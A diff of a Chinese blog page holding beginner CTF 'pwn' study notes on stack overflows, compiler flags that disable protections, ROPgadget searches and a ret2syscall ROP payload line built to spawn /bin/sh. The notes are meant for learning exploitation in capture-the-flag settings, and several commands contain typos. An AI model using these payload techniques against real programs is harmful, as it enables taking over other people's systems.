-<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="幻境" type="application/atom+xml">
-</head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
-     --><!--
-       --><li><a href="/archives/">Articles</a></li><!--
-     --><!--
-       --><li><a href="/categories/">Categories</a></li><!--
-     --><!--
-       --><li><a href="/links/">Links</a></li><!--
-     --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
-     --><!--
-       --><li><a href="/search/">Search</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="上一篇" href="/2023/09/01/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%5B%E5%9F%BA%E7%A1%80%E7%AF%87%5D/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="下一篇" href="/2023/08/27/%E8%8D%92%E8%AF%9E/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&text=pwn探索--大杂烩"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&title=pwn探索--大杂烩"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&is_video=false&description=pwn探索--大杂烩"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=pwn探索--大杂烩&body=Check out this article: https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&title=pwn探索--大杂烩"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&title=pwn探索--大杂烩"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&title=pwn探索--大杂烩"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&title=pwn探索--大杂烩"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&name=pwn探索--大杂烩&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/&t=pwn探索--大杂烩"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E8%AF%91%E4%B8%8E%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">程序的编译与链接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">编译过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%90%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E3%80%91"><span class="toc-number"></span> <span class="toc-text">【花式栈溢出】</span></a>
-      </div>
-    
-  </span>
-</div>
-
-    
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle p-name" itemprop="name headline">
-        pwn探索--大杂烩
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">yub</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2023-08-31T16:00:00.000Z" class="dt-published" itemprop="datePublished">2023-09-01</time>
-        
-      
-    </div>
-
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
-    </div>
-
-
-      
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/pwn-%E7%9F%A5%E8%AF%86%E7%A2%8E%E7%89%87/" rel="tag">pwn,知识碎片</a>
-    </div>
-
-
-    </div>
-  </header>
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
   
-
-  <div class="content e-content" itemprop="articleBody">
-    <p>pwn的核心：二进制漏洞的利用和挖掘<br>研究层次：编译成机器码的二进制程序的漏洞二进制程序实际为可执行文件<br>linux系统下ELF&#x3D;windows系统下EXE文件<br><strong>一次简单的hack</strong></p>
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="幻境" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url('https://thumbs.dreamstime.com/b/%E5%8A%A8%E6%BC%AB%E8%83%8C%E6%99%AF%E5%A5%87%E5%B9%BB%E6%8F%92%E5%9B%BE%E6%B8%B8%E6%88%8F%E7%8E%AF%E5%A2%83%E7%AB%A5%E4%B9%A6%E4%BB%99%E5%A2%83%E6%99%AF%E8%A7%82%E6%8F%92%E5%9B%BE-270943592.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="幻境"><span class="site-name">幻境</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pwn探索--大杂烩</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-31T16:00:00.000Z" title="发表于 2023-09-01 00:00:00">2023-09-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-01T15:36:43.124Z" title="更新于 2024-11-01 23:36:43">2024-11-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/" data-flag-title="pwn探索--大杂烩"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>pwn的核心：二进制漏洞的利用和挖掘<br>研究层次：编译成机器码的二进制程序的漏洞二进制程序实际为可执行文件<br>linux系统下ELF&#x3D;windows系统下EXE文件<br><strong>一次简单的hack</strong></p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230307002535708.png" alt="image-20230307002535708"></p>
 <p>CTF中pwn攻击脚本思路：</p>
 <p>1.pwn程序&#x2F;服务器（必不可少滴）开端——&gt;from pwn import*<br>2.使用python中pwn tools用remote函数打开远端需要攻击的服务器端口<br>3.进行链接<br>4.构造恶意数据<br>5.发送恶意数据<br>6.使用交互函数（io.interactive（））获取flag</p>
@@ -443,14 +210,8 @@
 <p><strong>缓冲区溢出中</strong> <strong>栈溢出控制程序流核心：</strong><br>当子函数返回父函数时会将<em>Ruturn Adress</em>中的值返回到PC寄存器eip（32位）中，当eip中值写入目标值的地址，既可<em>完成程序执行流的控制</em>。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230216235806404.png" alt="image-20230216235806404"></p>
 <p>举例演示：<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219153353227.png" alt="image-20230219153353227"></p>
-<pre><code class="c">#include&lt;stdio.h&gt;
-int main()
-&#123;
-   char str[8];
-   read (0,str,24);
-   retrun 0;
-&#125;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> str[<span class="number">8</span>];</span><br><span class="line">   read (<span class="number">0</span>,str,<span class="number">24</span>);</span><br><span class="line">   retrun <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>此时产生segmentation fault（段错误）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219154052743.png" alt="image-20230219154052743"></p>
 <p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230219154202756.png" alt="image-20230219154202756"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219161736349.png" alt="image-20230219161736349"></p>
@@ -482,12 +243,8 @@ int main()
 <p>p（pack）对数据进行打包变为字符型数据 ； 例：p32（0x8048522）打包为32bite位字符</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223104016114.png" alt="image-20230223104016114"></p>
 <p>gcc：Linux环境下的一款编译器。<br>ctrl+d 退出python交互环境!<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223112513513.png" alt="image-20230223112513513"><br>bss默认栈可执行<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230411152517155.png" alt="image-20230411152517155"><br>关闭随机化（ASLR）</p>
-<pre><code>-fro-stack-protector 关闭canary
--z exexstack 打开栈的可执行权限
--no-pie 关闭pie（程序编译时打开pie 将地址随机化为无关代码 即随机化elf文件）
--g 带上调试信息 调试时可以看见源代码（ret2stack.c未删除情况下）
--o 输出目标文件
-</code></pre>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-fro-stack-protector 关闭canary</span></span><br><span class="line"><span class="deletion">-z exexstack 打开栈的可执行权限</span></span><br><span class="line"><span class="deletion">-no-pie 关闭pie（程序编译时打开pie 将地址随机化为无关代码 即随机化elf文件）</span></span><br><span class="line"><span class="deletion">-g 带上调试信息 调试时可以看见源代码（ret2stack.c未删除情况下）</span></span><br><span class="line"><span class="deletion">-o 输出目标文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412200146471.png" alt="image-20230412200146471">chmod +x 给权限<br>shellcode(偏移+返回地址)</p>
 <p>地址空间随机化&lt;——操作系统实现  可输入0检查ASLR是否关闭<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223115046186.png" alt="image-20230223115046186"></p>
 <p>动态链接库看为1 地址随机分配 栈同（偏移值随机地址未知）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230224081202824.png" alt="image-20230223232443609"></p>
@@ -515,25 +272,25 @@ int main()
 <p>ROPgadget 获取text段所需汇编代码（ret——&gt;将栈中信息弹到eip中） eax、ebx优先【ROP总会至溢出retaddr后】</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410210009493.png" alt="image-20230409171200929"></p>
 <p>异或（xor）常用于清空缓冲区<br>flat()函数 接收一个列表参数将列表中的每一项都转为字节型数据并且自动把不足一字节数据进行填补</p>
-<pre><code>io = flat（[b&#39;A&#39;*112,pop_eax_ret,0xb,pop_eax_ecx_ebx_ret,0,0,bin_sh,int_80h]）
-</code></pre>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">io</span> = flat（[b&#x27;A&#x27;*<span class="number">112</span>,pop_eax_ret,<span class="number">0</span>xb,pop_eax_ecx_ebx_ret,<span class="number">0</span>,<span class="number">0</span>,bin_sh,int_80h]）</span><br></pre></td></tr></table></figure>
+
 <p>grep功能：对输入行中含有用户自定参数的行进行全部输出</p>
-<pre><code>ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; | head
-</code></pre>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ROPgadget</span> <span class="built_in">--binary</span> <span class="string">ret2syscall</span> <span class="built_in">--only</span> <span class="string">&quot;pop|ret&quot;</span> | <span class="string">head</span></span><br></pre></td></tr></table></figure>
+
 <p>sos 救大命踩坑！！！输入格式我哭死&#x2F;(ㄒoㄒ)&#x2F;<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410210009493.png" alt="image-20230410210009493"></p>
-<pre><code>ROPgadget  --binary ret2syscall --only &quot;pop|ret&quot; | grep eax
-</code></pre>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ROPgadget</span>  <span class="built_in">--binary</span> <span class="string">ret2syscall</span> <span class="built_in">--only</span> <span class="string">&quot;pop|ret&quot;</span> | <span class="string">grep</span> <span class="string">eax</span></span><br></pre></td></tr></table></figure>
+
 <p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230410194103144.png" alt="image-20230410194103144"></p>
-<pre><code>ROPgadget --binary 文件名 --only &quot;int&quot;(执行系统调用 当为0x80时中断结束0x80表示进行系统调用的call)
-</code></pre>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ROPgadget</span> --binary 文件名 --only <span class="string">&quot;int&quot;</span>(执行系统调用 当为<span class="number">0</span>x80时中断结束<span class="number">0</span>x80表示进行系统调用的call)</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410201002577.png" alt="image-20230410201002577"></p>
 <p>python3中必须用b转换为字节流型数据 generator转换器 next（）函数（前+hex转为十六进制）！！转化为十进制数据ww其实不如ROPgadget来的方便喽（目前个人觉得）</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412210903759.png"></p>
-<pre><code>ROPgadget --binary 文件名 --string &#39;/bin/sh&#39; (查询后门地址)
-</code></pre>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --<span class="built_in">binary</span> 文件名 --<span class="built_in">string</span> <span class="string">&#x27;/bin/sh&#x27;</span> (查询后门地址)</span><br></pre></td></tr></table></figure>
+
 <p>ret2text ret2shellcode 均直接含有后门函数 ret2text 自接收一串base64解码得flag ret2shellcode</p>
-<pre><code>sys_execve() -&gt;0xb
-</code></pre>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_execve<span class="function"><span class="params">()</span> -&gt;</span><span class="number">0xb</span></span><br></pre></td></tr></table></figure>
+
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412204604894.png" alt="image-20230412204604894"><br>内核系统调用函数名                            用户调用代号<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412214823229.png" alt="image-20230412214823229"></p>
 <p>静态链接和动态链接<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412214936627.png" alt="image-20230412214936627"></p>
 <p>区别：<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412215132315.png" alt="image-20230412215132315"></p>
@@ -545,35 +302,19 @@ int main()
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414212714060.png" alt="image-20230414212714060"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414214750326.png" alt="image-20230414214750326"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414214800705.png" alt="image-20230414214800705"></p>
-<pre><code>gcc -fro-pie -g -m32 -o link 动态链接文件名(32位)
-gcc -fro-pie -g -0 link 动态链接文件名（64位）
-</code></pre>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gcc</span> -fro-pie -g -m32 -o link 动态链接文件名(<span class="number">32</span>位)</span><br><span class="line"><span class="attribute">gcc</span> -fro-pie -g -<span class="number">0</span> link 动态链接文件名（<span class="number">64</span>位）</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414215358915.png"></p>
 <p>查看plt  x 地址——&gt;以二进制形式查看</p>
-<pre><code>pwndbg disass 地址-&gt;反汇编
-</code></pre>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">pwndbg</span> disass 地址-&gt;</span>反汇编</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414215358915.png" alt="image-20230414222605298"></p>
 <p>info b 查看断点信息  b 行号可下断点（含C代码情况下） d 行号可删除断点【无C语言 b 地址下断点】<br>c 遇到下一个断点&#x2F;输入（puts）&#x2F;程序中断 </p>
-<pre><code>b main == start 【若无main函数则停在程序入口第一条（start才为程序入口）】
-s 步进 n 步过
-backtrace 函数调用栈【呈现祖孙关系（😀）】
-return 直接回到main函数
-</code></pre>
-<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415092539078.png" alt="image-20230415092539078"></p>
-<pre><code>void secure()
-&#123;
-  unsigned int v0; // eax
-  int input; // [esp+18h] [ebp-10h] BYREF
-  int secretcode; // [esp+1Ch] [ebp-Ch]
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b main == <span class="built_in">start</span> 【若无main函数则停在程序入口第一条（<span class="built_in">start</span>才为程序入口）】</span><br><span class="line">s 步进 n 步过</span><br><span class="line">backtrace 函数调用栈【呈现祖孙关系（😀）】</span><br><span class="line"><span class="literal">return</span> 直接回到main函数</span><br></pre></td></tr></table></figure>
 
-  v0 = time(0);
-  srand(v0);
-  secretcode = rand();
-  __isoc99_scanf(&quot;%d&quot;, &amp;input);
-  if ( input == secretcode )
-    system(&quot;shell!?&quot;);
-&#125; //此处system函数虽无后门 但提供system plt表象 使得在text中可自动将执行流拉入libc段
-</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415092539078.png" alt="image-20230415092539078"></p>
+<figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> secure()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> <span class="keyword">input</span>; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> 